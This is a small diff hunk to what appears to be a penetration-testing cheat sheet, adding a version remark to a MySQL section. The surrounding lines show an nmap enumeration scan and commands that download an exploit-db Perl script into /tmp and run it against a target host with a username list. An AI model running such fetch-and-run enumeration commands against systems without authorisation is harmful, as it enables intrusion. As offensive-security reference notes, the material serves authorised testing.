@@ -34,6 +34,7 @@ sudo nmap $rhost -vv --script=mysql-enum
 ```
 
 ### CVE : [2015-5615](https://www.exploit-db.com/exploits/23081) (*3)
+mysql 4.x and below to a mysql 5.x server
 ```
 wget https://www.exploit-db.com/raw/23081 -O /tmp/mysqlenum.pl
 cd /tmp && perl mysqlenum.pl $rhost usernames.txt
